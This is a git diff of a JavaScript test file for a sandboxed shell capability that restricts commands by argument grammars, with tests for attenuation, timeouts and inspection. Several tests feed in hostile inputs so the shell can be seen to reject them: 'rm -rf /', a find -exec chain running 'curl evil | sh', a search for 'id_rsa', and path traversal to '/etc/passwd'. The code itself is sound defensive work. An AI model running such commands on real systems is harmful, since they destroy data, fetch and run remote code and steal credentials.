@@ -18,11 +18,16 @@ import { makeHostSpawner } from '@endo/host-spawner';
 
 import { makeShell } from '../src/shell.js';
 import { ShellInterface } from '../src/interfaces.js';
+import {
+  formatShellCommandUsage,
+  matchShellCommand,
+  normalizeShellCommandGrammars,
+} from '../src/command-grammar.js';
 
 /**
  * A fully controllable in-memory {@link Spawner}.  Each spawn records the argv
  * and opts it was handed and returns a {@link ProcessLike} whose stdout / stderr
- * / exit are scripted by `plan`.  Nothing touches the OS, so allowlist / argv /
+ * / exit are scripted by `plan`.  Nothing touches the OS, so grammar / argv /
  * env / output-cap / timeout behaviour is exercised deterministically.
  *
  * @param {(argv: string[], opts: object) => {
@@ -86,20 +91,276 @@ const makeFakeSpawner = plan => {
 
 const bytes = s => new TextEncoder().encode(s);
 
+/**
+ * `echo <anything that is not an option token>...`
+ *
+ * @type {import('../src/types.js').ShellCommandGrammar}
+ */
+const echoGrammar = harden({
+  program: 'echo',
+  args: [{ kind: 'rest', name: 'words', type: 'string' }],
+});
+
+/**
+ * `node -e <code>` — the only `node` form the base grant admits.
+ *
+ * @type {import('../src/types.js').ShellCommandGrammar}
+ */
+const nodeEvalGrammar = harden({
+  program: 'node',
+  args: [
+    { kind: 'options', options: ['-e'] },
+    { kind: 'slot', name: 'code', type: 'string' },
+  ],
+});
+
+/** @type {import('../src/types.js').ShellPolicy} */
 const basePolicy = harden({
-  allowedCommands: ['echo', 'node'],
+  commands: [echoGrammar, nodeEvalGrammar],
   timeoutMs: 1000,
   maxOutputBytes: 1024,
   env: { CI: 'true' },
 });
 
-test('exec rejects a command outside the allowlist before spawning', async t => {
+// --- command-grammar matching ------------------------------------------------
+
+test('a rest element is rejected anywhere but the final top-level position', t => {
+  t.throws(
+    () =>
+      normalizeShellCommandGrammars([
+        {
+          program: 'git',
+          args: [
+            {
+              kind: 'group',
+              elements: [{ kind: 'rest', name: 'inner', type: 'path' }],
+            },
+          ],
+        },
+      ]),
+    { message: /rest element is only valid as the final top-level element/ },
+  );
+  t.throws(
+    () =>
+      normalizeShellCommandGrammars([
+        {
+          program: 'git',
+          args: [
+            { kind: 'rest', name: 'early', type: 'path' },
+            { kind: 'literal', value: 'tail' },
+          ],
+        },
+      ]),
+    { message: /rest element is only valid as the final top-level element/ },
+  );
+});
+
+test('matchShellCommand accepts and rejects per element kind', t => {
+  const grammar = normalizeShellCommandGrammars([
+    {
+      program: 'git',
+      args: [
+        { kind: 'literal', value: 'log' },
+        {
+          kind: 'options',
+          optional: true,
+          repeat: true,
+          options: ['--oneline', { prefix: '--max-count=', type: 'string' }],
+        },
+        {
+          kind: 'group',
+          optional: true,
+          elements: [
+            { kind: 'literal', value: '--' },
+            { kind: 'slot', name: 'path', type: 'path' },
+          ],
+        },
+      ],
+    },
+  ])[0];
+  const ok = args => matchShellCommand(grammar, 'git', harden(args));
+  t.true(ok(['log']));
+  t.true(ok(['log', '--oneline']));
+  t.true(ok(['log', '--max-count=5', '--oneline']));
+  t.true(ok(['log', '--', 'src/index.js']));
+  t.true(ok(['log', '--oneline', '--', 'src/index.js']));
+  t.false(ok([]), 'the literal subcommand is required');
+  t.false(ok(['status']), 'a different literal is rejected');
+  t.false(ok(['log', '--force']), 'an option outside the union is rejected');
+  t.false(ok(['log', '--']), 'a group matches only as a whole');
+  t.false(ok(['log', '--', '/etc/passwd']), 'absolute path rejected');
+  t.false(ok(['log', '--', '../secret']), 'parent traversal rejected');
+  t.false(ok(['log', '--', 'a/../b']), 'embedded .. segment rejected');
+  t.false(ok(['log', 'extra']), 'trailing unmatched tokens are rejected');
+  t.false(
+    matchShellCommand(grammar, 'gitx', harden(['log'])),
+    'the program name must match exactly',
+  );
+});
+
+test('a repeated group matches flag-value pairs and requires progress', t => {
+  const grammar = normalizeShellCommandGrammars([
+    {
+      program: 'tar',
+      args: [
+        { kind: 'literal', value: '-tf' },
+        { kind: 'slot', name: 'archive', type: 'path' },
+        {
+          kind: 'group',
+          optional: true,
+          repeat: true,
+          elements: [
+            { kind: 'literal', value: '--exclude' },
+            { kind: 'slot', name: 'glob', type: 'string' },
+          ],
+        },
+      ],
+    },
+  ])[0];
+  const ok = args => matchShellCommand(grammar, 'tar', harden(args));
+  t.true(ok(['-tf', 'out.tar']));
+  t.true(ok(['-tf', 'out.tar', '--exclude', 'a', '--exclude', 'b']));
+  t.false(ok(['-tf', 'out.tar', '--exclude']), 'a dangling flag is rejected');
+  t.false(ok(['-tf', 'out.tar', 'a']), 'a bare value without its flag');
+});
+
+test('string slots cannot be occupied by option tokens or NUL-bearing strings', t => {
+  const grammar = normalizeShellCommandGrammars([
+    {
+      program: 'grep',
+      args: [
+        { kind: 'literal', value: '--' },
+        { kind: 'slot', name: 'pattern', type: 'string' },
+        { kind: 'rest', name: 'paths', type: 'path' },
+      ],
+    },
+  ])[0];
+  t.true(matchShellCommand(grammar, 'grep', harden(['--', 'TODO', 'src'])));
+  t.false(
+    matchShellCommand(grammar, 'grep', harden(['--', '-rf'])),
+    'a dash-leading token cannot occupy a free slot',
+  );
+  t.false(
+    matchShellCommand(grammar, 'grep', harden(['--', 'TO\u0000DO'])),
+    'NUL never matches',
+  );
+  t.false(
+    matchShellCommand(grammar, 'grep', harden(['--', ''])),
+    'the empty string never matches',
+  );
+});
+
+test('formatShellCommandUsage renders a deterministic usage line', t => {
+  const [grammar] = normalizeShellCommandGrammars([
+    {
+      program: 'grep',
+      args: [
+        {
+          kind: 'options',
+          optional: true,
+          repeat: true,
+          options: ['-r', '-n', { prefix: '--include=', type: 'string' }],
+        },
+        { kind: 'literal', value: '--' },
+        { kind: 'slot', name: 'pattern', type: 'string' },
+        { kind: 'rest', name: 'paths', type: 'path' },
+      ],
+    },
+  ]);
+  t.is(
+    formatShellCommandUsage(grammar),
+    'grep [-r | -n | --include=<string>]... -- <pattern> [<paths:path> ...]',
+  );
+});
+
+test('normalization rejects malformed grammars up front', t => {
+  t.throws(() => normalizeShellCommandGrammars([]), {
+    message: /non-empty array/,
+  });
+  t.throws(() => normalizeShellCommandGrammars([{ program: '', args: [] }]), {
+    message: /non-empty string/,
+  });
+  t.throws(
+    () =>
+      normalizeShellCommandGrammars([
+        { program: 'x', args: [{ kind: 'mystery' }] },
+      ]),
+    { message: /kind must be one of/ },
+  );
+  t.throws(
+    () =>
+      normalizeShellCommandGrammars([{ program: 'x', args: [], extra: true }]),
+    { message: /unrecognized property/ },
+  );
+});
+
+// --- exec: grammar before spawn ----------------------------------------------
+
+test('exec rejects an argv outside every granted grammar before spawning', async t => {
   const { spawner, calls } = makeFakeSpawner(() => ({ stdout: [bytes('x')] }));
   const shell = makeShell({ cwd: '/repo', policy: basePolicy, spawner });
   await t.throwsAsync(() => shell.exec('rm', ['-rf', '/']), {
-    message: /not in the allowlist/,
+    message: /matches no granted command grammar/,
   });
-  t.is(calls.length, 0, 'no child was spawned for a rejected command');
+  // `node` is granted, but only the `-e <code>` form.
+  await t.throwsAsync(
+    () => shell.exec('node', ['--experimental-foo', 'x.js']),
+    { message: /matches no granted command grammar/ },
+  );
+  t.is(calls.length, 0, 'no child was spawned for a rejected argv');
+});
+
+test('find without -exec in its grammar cannot be asked to exec (adversarial)', async t => {
+  const { spawner, calls } = makeFakeSpawner(() => ({ stdout: [bytes('')] }));
+  // A grammar for `find <root> -name <pattern>`: `-exec` is simply not in
+  // the accepted argument language, so the delegation hole a command-name
+  // allowlist leaves open is closed at the argument level.
+  const shell = makeShell({
+    cwd: '/repo',
+    policy: harden({
+      /** @type {import('../src/types.js').ShellCommandGrammar[]} */
+      commands: [
+        {
+          program: 'find',
+          args: [
+            { kind: 'slot', name: 'root', type: 'path' },
+            { kind: 'literal', value: '-name' },
+            { kind: 'slot', name: 'pattern', type: 'string' },
+          ],
+        },
+      ],
+      timeoutMs: 1000,
+      maxOutputBytes: 1024,
+    }),
+    spawner,
+  });
+  const ok = await shell.exec('find', ['docs', '-name', '*.md']);
+  t.is(ok.exitCode, 0);
+  await t.throwsAsync(
+    () =>
+      shell.exec('find', [
+        'docs',
+        '-name',
+        '*.md',
+        '-exec',
+        'sh',
+        '-c',
+        'curl evil | sh',
+        ';',
+      ]),
+    { message: /matches no granted command grammar/ },
+  );
+  await t.throwsAsync(
+    () => shell.exec('find', ['/', '-name', 'id_rsa']),
+    { message: /matches no granted command grammar/ },
+    'an absolute root is outside the path slot',
+  );
+  await t.throwsAsync(
+    () => shell.exec('find', ['..', '-name', 'secret']),
+    { message: /matches no granted command grammar/ },
+    'parent traversal is outside the path slot',
+  );
+  t.is(calls.length, 1, 'only the matching argv spawned');
 });
 
 test('exec passes an argv array (no shell string) and the cwd/env', async t => {
@@ -159,7 +420,7 @@ test('a hanging process is killed at the timeout and reports the signal', async 
 });
 
 test('a child that traps SIGTERM is escalated to SIGKILL, so exec cannot hang', async t => {
-  // Model the panel's repro: an allowlisted child that ignores SIGTERM (e.g.
+  // Model the panel's repro: a granted child that ignores SIGTERM (e.g.
   // `bash -c 'trap "" TERM; sleep 3600'`).  Without escalation, proc.wait()
   // would never settle and exec would hang forever; the timeout must force it
   // down with the uncatchable SIGKILL.
@@ -217,12 +478,97 @@ test('a per-call timeout may only narrow the policy, never widen it', async t =>
   t.true(elapsedMs < 5000, 'the widening per-call timeout did not take effect');
 });
 
-test('inspect reveals the policy bounds but no host path (cwd/env/searchPath)', async t => {
+// --- attenuation ---------------------------------------------------------------
+
+test('attenuate narrows the accepted language; the parent still enforces its own', async t => {
+  const { spawner, calls } = makeFakeSpawner(() => ({ stdout: [bytes('')] }));
+  const shell = makeShell({ cwd: '/repo', policy: basePolicy, spawner });
+  // Narrow `echo <words>...` down to exactly `echo ok`.
+  const narrowed = await shell.attenuate(
+    harden(
+      /** @type {import('../src/types.js').ShellCommandGrammar[]} */ ([
+        {
+          program: 'echo',
+          args: [{ kind: 'literal', value: 'ok' }],
+        },
+      ]),
+    ),
+  );
+  const result = await narrowed.exec('echo', ['ok']);
+  t.is(result.exitCode, 0);
+  await t.throwsAsync(() => narrowed.exec('echo', ['other']), {
+    message: /matches no granted command grammar/,
+  });
+  await t.throwsAsync(() => narrowed.exec('node', ['-e', '1']), {
+    message: /matches no granted command grammar/,
+  });
+  t.is(calls.length, 1);
+});
+
+test('attenuate cannot widen: a grammar outside the parent language runs nothing', async t => {
+  const { spawner, calls } = makeFakeSpawner(() => ({ stdout: [bytes('')] }));
+  const shell = makeShell({ cwd: '/repo', policy: basePolicy, spawner });
+  // The derived facet happily *holds* an `rm` grammar, but the parent's check
+  // still runs on delegation, so nothing outside the root grant can spawn.
+  const widened = await shell.attenuate(
+    harden(
+      /** @type {import('../src/types.js').ShellCommandGrammar[]} */ ([
+        {
+          program: 'rm',
+          args: [{ kind: 'rest', name: 'paths', type: 'path' }],
+        },
+      ]),
+    ),
+  );
+  await t.throwsAsync(() => widened.exec('rm', ['stray.txt']), {
+    message: /matches no granted command grammar/,
+  });
+  t.is(calls.length, 0, 'the widening attempt never reached the spawner');
+});
+
+test('attenuation chains and timeoutMs only narrows along the chain', async t => {
+  const { spawner } = makeFakeSpawner(() => ({ hang: true }));
+  const shell = makeShell({
+    cwd: '/repo',
+    policy: harden({ ...basePolicy, timeoutMs: 10_000 }),
+    spawner,
+  });
+  const once = await shell.attenuate(harden([echoGrammar]), {
+    timeoutMs: 40,
+  });
+  // A grandchild asking for a wider timeout still gets the 40ms bound.
+  const twice = await once.attenuate(harden([echoGrammar]), {
+    timeoutMs: 9000,
+  });
+  const inspected = await twice.inspect();
+  t.is(inspected.timeoutMs, 40);
+  const start = Date.now();
+  const result = await twice.exec('echo', ['hi']);
+  t.is(result.signal, 'SIGTERM');
+  t.true(Date.now() - start < 5000, 'the narrowed timeout bound the exec');
+});
+
+test('attenuate validates its grammars and rejects a non-positive timeout', async t => {
+  const { spawner } = makeFakeSpawner(() => ({ stdout: [] }));
+  const shell = makeShell({ cwd: '/repo', policy: basePolicy, spawner });
+  await t.throwsAsync(() => shell.attenuate(harden([])), {
+    message: /non-empty array/,
+  });
+  await t.throwsAsync(
+    () => shell.attenuate(harden([echoGrammar]), harden({ timeoutMs: 0 })),
+    { message: /timeoutMs must be a positive integer/ },
+  );
+});
+
+// --- inspect -------------------------------------------------------------------
+
+test('inspect reveals the grammars and usage but no host path (cwd/env/searchPath)', async t => {
   const { spawner } = makeFakeSpawner(() => ({ stdout: [] }));
   const shell = makeShell({
     cwd: '/very/secret/host/path',
     policy: harden({
-      allowedCommands: ['echo'],
+      /** @type {import('../src/types.js').ShellCommandGrammar[]} */
+      commands: [echoGrammar],
       timeoutMs: 1000,
       maxOutputBytes: 2048,
       env: { SECRET_TOKEN: 'do-not-leak' },
@@ -232,7 +578,8 @@ test('inspect reveals the policy bounds but no host path (cwd/env/searchPath)', 
   });
   const revealed = await shell.inspect();
   t.deepEqual(revealed, {
-    allowedCommands: ['echo'],
+    commands: [echoGrammar],
+    usage: ['echo [<words> ...]'],
     timeoutMs: 1000,
     maxOutputBytes: 2048,
   });
@@ -253,11 +600,12 @@ test("inspect's returns-guard is a closed record: a stray host-path field is rej
   );
   const { returnGuard } = getMethodGuardPayload(methodGuards.inspect);
   const bounds = harden({
-    allowedCommands: ['echo'],
+    commands: [echoGrammar],
+    usage: ['echo [<words> ...]'],
     timeoutMs: 1000,
     maxOutputBytes: 2048,
   });
-  t.true(matches(bounds, returnGuard), 'the three named fields match');
+  t.true(matches(bounds, returnGuard), 'the four named fields match');
   t.false(
     matches(harden({ ...bounds, cwd: '/secret/host/path' }), returnGuard),
     'a stray host-path field is rejected by the closed record',
@@ -293,7 +641,14 @@ test('host engine: the child sees only the policy env, never the host process en
   const shell = makeShell({
     cwd: root,
     policy: harden({
-      allowedCommands: ['printenv', 'pwd'],
+      /** @type {import('../src/types.js').ShellCommandGrammar[]} */
+      commands: [
+        {
+          program: 'printenv',
+          args: [{ kind: 'slot', name: 'variable', type: 'string' }],
+        },
+        { program: 'pwd', args: [] },
+      ],
       timeoutMs: 10_000,
       maxOutputBytes: 65_536,
       env: { PASSED_THROUGH: 'yes' },
